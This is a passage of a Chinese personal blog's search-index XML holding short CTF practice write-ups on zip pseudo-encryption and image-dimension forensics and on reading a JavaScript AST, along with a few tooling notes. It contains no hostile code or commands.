                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404180146023.png"
                      alt="image-20240418014608801"
                ></p>
<blockquote>
<p>路径引用问题将下面的改为绝对路径即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404180146290.png"
                      alt="image-20240418014650216"
                ></p>
</blockquote>
]]></content>
      <categories>
        <category>开发</category>
        <category>IOT</category>
        <category>Clion</category>
      </categories>
  </entry>
  <entry>
    <title>基本使用</title>
    <url>/2024/03/01/%E5%BC%80%E5%8F%91/IOT/proteus/%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>开发</category>
        <category>IOT</category>
        <category>proteus</category>
      </categories>
  </entry>
  <entry>
    <title>压缩包</title>
    <url>/2023/04/01/CTF%20WP/Misc/ctfshow/%E5%A5%87%E6%80%AA%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    <content><![CDATA[<p>其首先用的是伪加密</p>
<p>参考<a class="link"   href="https://blog.csdn.net/qq_43625917/article/details/96148661" >(22条消息) MISC-zip压缩包的总结_Qwzf的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>把504B0304后的第3、4个byte改成0000还有<br>把504B0102后的第5、6个byte改成0000即可破解伪加密。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221455883-483475346.png"
                      alt="image"
                ></p>
<p>png隐藏在了压缩包内的png文件内（压缩包套个压缩包）</p>
<p>可用binwalk来检测是否有隐藏</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221515173-486806216.png"
                      alt="image"
                ></p>
<p>隐藏了一个叫flag.png的文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\Misc\ctfshow\奇怪的压缩包\1.assets\image-20230331224501180.png"
                      alt="image-20230331224501180"
                ></p>
<p>这个key不是密码</p>
<p>大概是base64加密，解一解看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221522275-226782052.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306230155766.png"
                      alt="image-20230331224619806"
                ></p>
<p>yurenjie是它的密码</p>
<p>只不过这个图片也是被改过长宽高的改回来是这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221545878-423893092.png"
                      alt="image"
                ></p>
<p>不晓得啥意思</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221553456-1396350623.png"
                      alt="image"
                ></p>
<p>flag.png也是被改过长宽的，调整回去，直接得到了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2023.cnblogs.com/blog/3069852/202304/3069852-20230401221600928-7076500.png"
                      alt="image"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Misc</category>
        <category>ctfshow</category>
        <category>奇怪的压缩包</category>
      </categories>
  </entry>
  <entry>
    <title>操作</title>
    <url>/2024/06/08/Pwn/linux/tool/pwndbg/%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/murkuo/p/15965270.html" >pwndbg 基本操作指令 - MuRKuo - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.bookstack.cn/read/CTF-All-In-One/doc-2.3.1_gdb.md#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C" >动态分析工具 - 2.3.1 GDB - 《CTF 竞赛入门指南(CTF All In One)》 - 书栈网 · BookStack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Pwn</category>
        <category>linux</category>
        <category>tool</category>
        <category>pwndbg</category>
      </categories>
  </entry>
  <entry>
    <title>SWPUCTF 2021 新生赛astJS</title>
    <url>/2023/07/08/CTF%20WP/Re/js/ast/SWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9BastJS/</url>
    <content><![CDATA[<p>猜错了，可以通过escodegen包来生成对应的js代码</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">npm i escodegen optionator  -g</span><br><span class="line">esgenerate &quot;对应的ast语法树json文件&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307082207330.png"
                      alt="image-20230708220700293"
                ></p>
<p>直接运行此段代码即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307082208792.png"
                      alt="image-20230708220815639"
                ></p>
<p>AST抽象语法树是在js代码生成过程中产生的，似乎是不可直接生成代码的类似于python的字节码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307082100647.png"
                      alt="image-20230708210047544"
                ></p>
<p>结构是层层递进的，外面是类似于程序名的东西，可以通过层层展开来寻找对应的同级的代码逻辑</p>
<p>下面是在body内第一个声明的，类型是函数声明(“FunctionDeclaration”)</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;FunctionDeclaration&quot;</span><span class="punctuation">,</span><span class="comment">//类型函数声明</span></span><br><span class="line">  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">18</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">177</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span><span class="comment">//声明函数名为bE</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">27</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">29</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bE&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;generator&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;async&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="comment">//声明函数的参数，此处声明了两个一个叫str，一个叫key，类型未知</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">30</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">33</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">34</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">37</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;key&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BlockStatement&quot;</span><span class="punctuation">,</span><span class="comment">//一个代码块集合，是function的body的一部分，相当于function的代码块</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">38</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">177</span><span class="punctuation">,</span><span class="comment">//定义代码块起始与终止位置</span></span><br><span class="line">    <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VariableDeclaration&quot;</span><span class="punctuation">,</span><span class="comment">//此处有多层VariableDeclaration,相当于多个变量声明</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">46</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">70</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;declarations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VariableDeclarator&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">69</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">53</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arr&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//变量名为arr</span></span><br><span class="line">            <span class="attr">&quot;init&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//变量的初始化，为init包裹的内部的计算后的值</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">69</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">65</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">56</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">59</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">60</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">65</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;split&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">              <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//调用split函数</span></span><br><span class="line">              <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Literal&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">66</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">68</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;raw&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="comment">//传入split函数的参数</span></span><br><span class="line">              <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;var&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//可翻译为arr=str.split()</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ReturnStatement&quot;</span><span class="punctuation">,</span><span class="comment">//代码块的返回值(此处只有一个代码块，相当于整个函数的返回值)</span></span><br><span class="line">        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">77</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">171</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;argument&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">171</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">167</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">162</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">91</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">84</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">87</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arr&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">88</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">91</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;map&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">              <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//arr.map</span></span><br><span class="line">              <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ArrowFunctionExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">92</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">161</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;generator&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;async&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">93</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">94</span><span class="punctuation">,</span></span><br><span class="line">                      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;i&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BlockStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">97</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">161</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                      <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ReturnStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">107</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;argument&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                          <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">153</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">133</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">114</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">120</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//调用对应的类方法fromcharcode</span></span><br><span class="line">                              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">121</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">133</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fromCharCode&quot;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">                          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                          <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                              <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BinaryExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">152</span><span class="punctuation">,</span></span><br><span class="line">                              <span class="attr">&quot;left&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CallExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">148</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;callee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MemberExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">146</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;object&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">134</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">135</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;i&quot;</span></span><br><span class="line">                                  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;property&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifier&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="number">136</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;end&quot;</span><span class="punctuation">:</span> <span class="number">146</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;charCodeAt&quot;</span></span><br><span class="line">                                  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;computed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                                  <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="literal"><span 